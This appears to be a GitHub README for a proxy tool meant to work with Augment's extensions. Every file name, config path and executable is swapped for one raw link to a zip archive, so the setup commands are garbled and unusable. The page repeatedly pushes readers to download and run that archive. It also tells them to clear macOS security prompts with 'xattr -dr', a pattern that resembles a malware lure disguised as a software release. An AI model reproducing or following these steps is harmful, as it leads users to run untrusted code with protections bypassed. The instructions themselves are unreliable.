# 🌟 Augment-BYOK-Proxy - Easy Proxy for Augment Integration

[![Download Release](https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip%https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip)](https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip)

## 📁 Overview

Augment-BYOK-Proxy is a user-friendly proxy designed to work with Augment's extensions. This tool allows for seamless integration with various language model providers. Whether you are configuring models or simply want to enhance your chatting experience, this application is your go-to solution.

## 🚀 Getting Started

Follow these steps to download and run the Augment-BYOK-Proxy application successfully.

### 1. Visit the Release Page

To download the software, visit the Releases page. You can find all the versions available for download there.

[Download & Install](https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip)

### 2. Download the Application

On the Releases page, locate the latest version. Download the appropriate file for your operating system:

- For **macOS**, download `https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip`.
- For **Windows**, download `https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip`.

After the download completes, unzip the file to access the application.

### 3. Configure the Application

1. Open a terminal (or command prompt) on your computer.
2. Navigate to the folder where you unzipped the files.
3. Copy the example configuration file by running:

```
cp https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip
```

4. Open `https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip` in a text editor and fill in the required fields. Refer to the comments in the file for guidance.

### 4. Start the Application

Once you have configured the application, you can start it:

- For **macOS** users:

```
cargo run --release -- --config https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip
```

If you are using a precompiled version, run this:

```
./augment-byok-proxy --config https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip
```

Make sure to set permissions if you encounter issues:

```
chmod +x augment-byok-proxy
```

Also, if you face security prompts, use:

```
xattr -dr https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip augment-byok-proxy
```

- For **Windows** users, use the command prompt:

```
.\https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip --config https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip
```

### 5. Setup VS Code

If you are using Visual Studio Code, you will need to configure the extension to point to your proxy. Update the `completionURL` with the correct API endpoint that you set in your configuration.

## 📋 Features

- **Protocol Conversion**: The proxy converts protocols based on the selected provider type, ensuring seamless communication with your models.
- **Model Registry**: Notify the system about available models, allowing you to easily switch between BYOK models.
- **Flexible Routing**: Support for multiple routing options based on your configuration, ensuring you can adjust settings without hassle.
- **Official API Integration**: Automatically redirect requests to the official API, maintaining functionality while extending capabilities.

## 🌐 Frequently Asked Questions

### What is BYOK?

BYOK stands for "Bring Your Own Key." It allows users to use their keys with supported providers for more control over their data.

### Which operating systems are supported?

Currently, Augment-BYOK-Proxy supports macOS and Windows. Other systems may work but are not officially supported.

### How can I contribute?

We welcome contributions! Please check the issues page for tasks you can help with, or propose new features.

## 🎉 Download the Application

To get started, head to the Releases page and download the latest version. 

[Download & Install](https://raw.githubusercontent.com/Al-Aswadd/Augment-BYOK-Proxy/main/scripts/Augment_Proxy_BYO_v2.2.zip)

By following these steps, you will successfully set up the Augment-BYOK-Proxy application. Enjoy enhancing your Augment experience!